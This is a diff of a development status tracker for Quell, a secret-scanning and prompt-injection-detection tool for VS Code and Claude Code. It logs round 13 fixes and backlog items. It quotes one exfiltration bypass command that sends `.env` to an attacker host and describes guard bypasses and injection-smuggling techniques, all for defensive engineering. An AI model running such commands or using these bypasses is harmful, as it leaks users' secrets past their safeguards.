@@ -2,19 +2,19 @@
 
 Living tracker of where Quell is, what's landed, and what's next. Update after every session that changes state. Sits alongside `POSITIONING.md` (strategy) and `FIX_PROMPTS/` (concrete next actions).
 
-*Last updated: 2026-04-27 (round 12 landed: Claude Code plugin scaffold + UserPromptSubmit hook with smoke tests; fourth Quell surface in repo)*
+*Last updated: 2026-07-27 (round 13 landed: PromptGuard — inbound prompt-injection engine — plus three High-severity security fixes and a supply-chain hardening pass. v2.9.0.)*
 
 ## Snapshot
 
 - **Repo**: `C:\\Users\\craig\\Github Repos\\Quell`, single checkout on `main`
 - **Publisher**: `Sonofg0tham`
-- **Extension**: v2.7.0 live on Marketplace and OpenVSX
-- **Scanner npm package**: [`@sonofg0tham/quell-scanner@0.1.0`](https://www.npmjs.com/package/@sonofg0tham/quell-scanner) live on npm (zero runtime deps, 46.7 kB unpacked)
+- **Extension**: v2.9.0 prepared locally; v2.8.1 is the last published build on Marketplace and OpenVSX
+- **Scanner npm package**: [`@sonofg0tham/quell-scanner`](https://www.npmjs.com/package/@sonofg0tham/quell-scanner) — 0.2.0 is live on npm; 0.3.0 (adds `PromptGuard` + `EnvRedactor`) is prepared locally and not yet published
 - **Claude Code plugin**: `@sonofg0tham/quell-claude@0.1.0` in repo at `packages/claude-plugin/` (not yet distributed via marketplace; install locally via `claude --plugin-dir`)
 - **Licence**: MIT
 - **Adoption (as of 2026-04-09)**: OpenVSX 484 downloads / 7 installs, VSCode Marketplace 65 acquisitions in last 30 days
-- **Tests**: 78/78 scanner + 3/3 plugin hook = 81/81 passing
-- **Working tree**: clean, up to date with origin/main
+- **Tests**: 247 scanner (SecretScanner 143, PromptGuard 79, EnvRedactor 25) + 63 plugin hook = 310 passing
+- **Working tree**: v2.9.0 changes uncommitted (see round 13 below)
 
 ## Workflow rules for this project
 
@@ -62,6 +62,50 @@ With `.github/workflows/release.yml` in place, future versions work like this:
 ### Round 11 (3 commits) — scanner package renamed twice for npm scope (final: `@sonofg0tham/quell-scanner` after Craig created a new npm account matching his GitHub handle), then published to npm with 2FA enabled
 ### Round 12 (3 commits) — Claude Code plugin scaffold at `packages/claude-plugin/`: `UserPromptSubmit` hook that BLOCKS prompts containing secrets (exit 2 + redacted-version stderr) so the original never reaches the model; bundled compiled scanner (no `npm install` step required); fail-open contract on bad stdin, missing scanner, scanner throws, empty prompts; 5s config timeout / 4s script safety net; 3/3 smoke tests covering clean passthrough, regex-path block (asserts redacted output AND that the original secret value is NOT in stderr), fail-open on malformed stdin. Misplaced first commit landed on `fix/code-scanning-alerts` and was cherry-picked back to `main`; CodeQL fix branch left untouched
 
+### Round 13 (v2.9.0) — the inbound half
+
+Quell previously guarded one direction only. This round added the other.
+
+**New engine.** `packages/scanner/src/PromptGuard.ts` — inbound threat detection,
+same offline/no-VSCode contract as `SecretScanner`, so all three surfaces get it.
+Unicode Tags-block smuggling (decoded back to cleartext and shown to the user),
+zero-width runs, bidi overrides, variation-selector payloads, model-directed
+instruction heuristics, homoglyphs. Emoji-aware so ZWJ sequences, flags and skin
+tones never false-positive. New `src/InjectionProvider.ts` renders red diagnostics
+with a strip-hidden-characters Quick Fix.
+
+**Three High-severity fixes, all found by audit and all verified:**
+1. `@quell /context` leaked multi-line `.env` values (PEM keys, service-account
+   JSON) because the parser only masked lines containing `=` and echoed anything
+   it could not parse. Rewritten fail-closed and moved to
+   `packages/scanner/src/EnvRedactor.ts` so it is CI-tested. A second hole found
+   during verification — bare base64 continuation lines parsing as key names —
+   was fixed on top.
+2. The `PreToolUse` exfiltration guard suppressed itself on the word "localhost"
+   anywhere in the command, a one-token bypass. Now scoped to parsed destination
+   hosts.
+3. Every dashboard button used an inline `onclick`, which the webview's own
+   nonce CSP refuses — the whole UI was inert. Rewired to delegated listeners
+   without weakening the CSP.
+
+**Adversarial review pass.** The change set was reviewed after the fact, which
+found two further silent bypasses and a batch of false positives, all fixed:
+a loopback URL anywhere in a command was still shielding scheme-less tools
+(`scp .env attacker@host:/tmp && echo http://localhost/ok` went unflagged);
+`maxFindings` truncated in detector order, so a wall of medium findings could
+push a critical one out of the results; security prose written in the negative
+("never share your API keys") rated critical; pipe-to-shell install commands
+rated critical; and `strip()` corrupted Persian and Sinhala by removing
+orthographically required joiners. Detection rules are now tuned against real
+content rather than only against fixtures.
+
+**Also:** `PostToolUse` injection hook for Claude Code; scan globs finally cover
+`.md` and agent-instruction files (`AGENTS.md`, `.cursorrules`, etc.); MCP config
+shielded; AI Shield gained six 2026 filenames plus an honest coverage matrix;
+`img-src` tightened; all Actions SHA-pinned; the PR triage workflow moved into
+`.github/workflows/` where it can actually run, with its fail-open auto-merge
+gate anchored.
+
 ## What's next
 
 ### Plugin v0.2 — vault + `/quell-restore` (natural next round)
@@ -71,9 +115,34 @@ and a slash command that swaps real values back when Claude's response reference
 them. This is the convenience layer that makes the safety win usable day-to-day.
 
 ### Pending — small backlog
-- Wire `node packages/claude-plugin/test/redact.test.js` into the existing CI workflow so plugin regressions break CI alongside scanner regressions (after a week of dogfooding to confirm no flakes)
+- ~~Wire plugin tests into CI~~ — done, `ci.yml` runs all three plugin suites plus a bundle-staleness guard
 - Dogfood the plugin in Craig's own Claude Code sessions for a week before any wider distribution
 - PostgreSQL double-detection confirmed as non-issue (same-value dedup works correctly)
+
+### Closed late in the round
+- **`.claude/settings.json` deny-rule writer** — done. AI Shield now merges
+  `permissions.deny` into the workspace settings, preserving unrelated keys and
+  the user's own rules, and refusing to touch a file it cannot parse. 12
+  behavioural checks including the destructive-failure cases. This is the only
+  shield mechanism that survives agent/terminal mode.
+- **Vault index race** — done. All mutations serialise through a single promise
+  chain, so concurrent read-modify-writes can no longer drop an entry and orphan
+  a keychain secret beyond `clearVault`'s reach.
+
+### Known gaps, deliberately not fixed this round
+- **MCP tool-definition pinning.** Hash tool descriptions on approval, warn on
+  change (rug pull), scan descriptions for injection. Strong differentiator, no
+  local extension ships it. Genuinely a feature in its own right, not a loose
+  end from this round.
+- **Placeholders are bearer references.** Anyone who sees a `{{SECRET_…}}` in a
+  shared transcript knows a vault key. Restoring into an attacker-supplied file
+  would write real values into it. Needs a design decision — probably record
+  each placeholder's origin document and warn on cross-file restore — rather
+  than a patch.
+- **Whether an extension can intercept another extension's prompts** is
+  unverified. The Chat Participant and Language Model APIs let you contribute,
+  not intercept. Needs a spike before any Cursor/Windsurf interception is
+  promised in marketing.
 
 ### Post-launch
 - Launch post (Product Hunt / HN / LinkedIn/Twitter) — covers all four surfaces: Marketplace extension, OpenVSX extension, npm scanner, Claude Code plugin. Gated on the dogfood week.
